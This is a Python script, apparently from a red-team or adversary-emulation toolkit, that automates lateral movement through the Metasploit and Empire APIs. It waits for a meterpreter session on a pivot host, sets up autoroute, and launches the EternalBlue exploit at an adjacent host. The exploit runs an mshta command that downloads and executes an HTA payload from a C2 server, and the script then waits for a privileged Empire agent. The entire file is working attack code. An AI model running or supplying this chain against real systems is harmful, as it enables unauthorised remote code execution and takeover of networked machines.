"""
This procedure script demonstrates lateral Remote Code Execution:
1. Waiting for initial meterpreter sesion from pivot node (.191)
2. Start MSF autoroute on pivot node
3. Launch EternalBlue thru pivot to adjacent target (.196)
4. Wait for Empire session from earlier step

Demo: https://www.youtube.com/watch?v=xI0cSbGo4ZY

In reality, one would perform a scan after step 2 & check if target is vulnerable
"""
from c2_settings import *
from EmpireAPIWrapper import empireAPI
from pymetasploit.msfrpc import MsfRpcClient
from stage2.external_c2 import msf_wait_for_session, empire_wait_for_agent
from stage3.internal_c2.windows import msf_autoroute
from stage3.escalate_privilege.windows import msf_eternal_blue

# Set both API instances for MSF & Empire
client = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
target_address = '192.168.181.196' # by right, should do a scan to get next target

# Step 1 - Wait for pivot
msf_session_id = msf_wait_for_session.run(client)

# Step 2 - Setup autoroute on pivot
msf_autoroute.run(client, msf_session_id)

# Step 3 - Launch EB payload via pivot to target
cmd = 'mshta.exe http://empirec2:8000/o.hta'
msf_eternal_blue.run(client, target_address, cmd)

# Step 4 - Wait for high_integrity empire agent
empire_agent = empire_wait_for_agent.run(API, need_privilege=True)
print(empire_agent)